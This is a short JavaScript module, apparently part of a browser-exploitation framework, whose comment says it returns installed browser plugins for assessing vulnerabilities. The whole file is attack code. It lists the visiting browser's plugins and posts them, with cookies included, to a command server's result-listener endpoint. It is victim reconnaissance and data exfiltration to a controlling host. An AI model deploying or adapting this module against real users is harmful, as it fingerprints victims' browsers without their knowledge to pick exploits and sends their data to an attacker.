/*
Module to return installed browser plugins for assessing vulnerablities
*/

(function getBrowserPlugins() {
    pluginNames = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
        pluginNames.push(navigator.plugins[i].name);
    }
    let formData = new FormData();

    formData.append('result', pluginNames.join(', '))
    formData.append('module_value', 'browser_plugins.js')

    fetch(`${protocol}://${server}/command/result_listener`, {
        method: "POST",
        mode: 'cors',
        credentials: "include",
        body: formData
    })
})()